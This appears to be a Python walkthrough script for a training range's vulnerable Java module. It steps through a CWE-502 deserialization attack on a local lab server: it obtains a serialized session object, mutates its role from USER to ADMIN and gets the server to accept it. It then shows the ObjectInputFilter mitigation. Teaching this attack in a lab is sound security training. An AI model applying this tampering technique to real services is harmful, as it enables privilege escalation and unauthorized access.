#!/usr/bin/env python3
"""
Educational: Java Serialization Payload Generator (CWE-502)

This script generates base64-encoded Java serialized payloads to demonstrate
how an attacker can exploit Java deserialization of untrusted bytes.

Prerequisites:
    - m06-deserialization running on http://127.0.0.1:8086
    - python3 with urllib

Usage:
    python3 generate-payloads.py
"""

import base64
import json
import struct
import sys
import urllib.request


BASE_URL = "http://127.0.0.1:8086"
EXPLOIT = f"{BASE_URL}/exploit"


def http_get(path):
    """Make a GET request and return JSON response."""
    url = f"{BASE_URL}{path}"
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=8) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        print(f"  ERROR: {e}")
        sys.exit(1)


def http_post(path, data):
    """Make a POST request with JSON data and return JSON response."""
    url = f"{BASE_URL}{path}"
    try:
        payload = json.dumps(data).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        print(f"  ERROR: {e}")
        sys.exit(1)


def print_step(step, title):
    """Print a formatted step header."""
    print()
    print("=" * 70)
    print(f"  STEP {step}: {title}")
    print("=" * 70)


def step1_generate_payload():
    """Step 1: Generate a valid serialized payload from the server."""
    print_step(1, "Generate a valid serialized payload")

    print("  The server generates a HashMap<SessionData, String> and returns it")
    print("  as base64-encoded Java serialized bytes.")
    print()

    response = http_get("/exploit/step1/generate-payload")
    print("  Server response:")
    print(f"    {json.dumps(response, indent=4)}")
    print()

    base64_payload = response["base64"]
    with open("/tmp/vulnrange-m06-exploit/step1_payload.b64", "w") as f:
        f.write(base64_payload)

    print(f"  Payload saved to: /tmp/vulnrange-m06-exploit/step1_payload.b64")
    return base64_payload


def step2_analyze_payload():
    """Step 2: Analyze the payload structure."""
    print_step(2, "Analyze the payload structure")

    print("  Understanding the byte layout helps the attacker mutate fields.")
    print()

    response = http_get("/exploit/step2/analyze-payload")
    print("  Server response:")
    print(f"    {json.dumps(response, indent=4)}")
    print()

    print("  Structure breakdown:")
    structure = response.get("structure", {})
    for key, value in structure.items():
        print(f"    {key:15} -> {value}")
    print()

    hex_dump = response.get("hex", "")
    with open("/tmp/vulnrange-m06-exploit/step2_hex.txt", "w") as f:
        f.write(hex_dump)

    print(f"  Hex dump saved to: /tmp/vulnrange-m06-exploit/step2_hex.txt")
    return response


def step3_deserialize(base64_payload):
    """Step 3: Deserialize the payload (prove the primitive works)."""
    print_step(3, "Deserialize the payload (prove the primitive works)")

    print("  Send the base64 payload to /step3/deserialize.")
    print("  The server deserializes it WITHOUT any type filter.")
    print()

    response = http_post("/exploit/step3/deserialize", {"base64": base64_payload})
    print("  Server response:")
    print(f"    {json.dumps(response, indent=4)}")
    print()

    print("  ^^^ The server accepted and deserialized the payload.")
    print("  ^^^ The attacker controlled which class was instantiated.")
    print()

    return response


def step4_mutate_payload():
    """Step 4: Mutate the payload (change role from USER to ADMIN)."""
    print_step(4, "Mutate the payload (change role from USER to ADMIN)")

    print("  An attacker can modify field values in the serialized bytes.")
    print("  Here we change the role from 'USER' to 'ADMIN'.")
    print()

    response = http_get("/exploit/step4/mutate-payload")
    print("  Server response:")
    print(f"    {json.dumps(response, indent=4)}")
    print()

    mutated_base64 = response.get("mutatedBase64", "")
    with open("/tmp/vulnrange-m06-exploit/step4_mutated.b64", "w") as f:
        f.write(mutated_base64)

    print(f"  Mutated payload saved to: /tmp/vulnrange-m06-exploit/step4_mutated.b64")
    print("  Mutation: role changed from 'USER' to 'ADMIN'")
    print()

    return mutated_base64


def step5_prove_attack(mutated_base64):
    """Step 5: Prove the attack with mutated payload."""
    print_step(5, "Prove the attack (mutated payload accepted)")

    print("  Send the mutated payload to the server.")
    print("  The server accepts it because there is no integrity check.")
    print()

    response = http_post("/exploit/step3/deserialize", {"base64": mutated_base64})
    print("  Server response:")
    print(f"    {json.dumps(response, indent=4)}")
    print()

    print("  ^^^ The mutated role was accepted by the server.")
    print("  ^^^ This demonstrates the integrity bypass.")
    print()


def step6_show_mitigation(base64_payload):
    """Step 6: Show the mitigation (ObjectInputFilter)."""
    print_step(6, "Show the mitigation (ObjectInputFilter)")

    print("  With ObjectInputFilter, the server rejects unauthorized classes.")
    print()

    response = http_post("/exploit/step6/mitigation", {"base64": base64_payload})
    print("  Server response:")
    print(f"    {json.dumps(response, indent=4)}")
    print()

    print("  ^^^ The filter blocked the deserialization.")
    print()


def main():
    """Run all exploit steps."""
    print("=" * 70)
    print("  Java Deserialization Exploit Guide (CWE-502)")
    print(f"  Target: {BASE_URL}")
    print("=" * 70)

    # Check if target is running
    try:
        http_get("/exploit/step1/generate-payload")
    except SystemExit:
        print("\n  ERROR: Target is not running.")
        print("  Start the m06-deserialization module first:")
        print("    java -jar m06-deserialization-1.0.0.jar")
        sys.exit(1)

    print("\n  Target is running. Starting exploit guide...\n")

    # Step 1: Generate payload
    base64_payload = step1_generate_payload()

    # Step 2: Analyze payload
    step2_analyze_payload()

    # Step 3: Deserialize (prove primitive)
    step3_deserialize(base64_payload)

    # Step 4: Mutate payload
    mutated_base64 = step4_mutate_payload()

    # Step 5: Prove attack
    step5_prove_attack(mutated_base64)

    # Step 6: Show mitigation
    step6_show_mitigation(base64_payload)

    # Summary
    print("=" * 70)
    print("  SUMMARY")
    print("=" * 70)
    print()
    print("  Vulnerability: Java deserialization of untrusted bytes (CWE-502)")
    print("  Impact: Attacker controls object creation, can bypass authorization")
    print("  Root cause: No ObjectInputFilter on ObjectInputStream.readObject()")
    print()
    print("  Mitigation:")
    print("    1. Add ObjectInputFilter to restrict allowed classes")
    print("    2. Use JSON (Jackson) instead of Java serialization")
    print("    3. Validate and sanitize all input before deserialization")
    print()
    print("  Files generated in: /tmp/vulnrange-m06-exploit/")
    print("    step1_payload.b64    - Original payload")
    print("    step2_hex.txt        - Hex dump of payload structure")
    print("    step4_mutated.b64    - Mutated payload (role changed)")
    print()
    print("=" * 70)


if __name__ == "__main__":
    main()
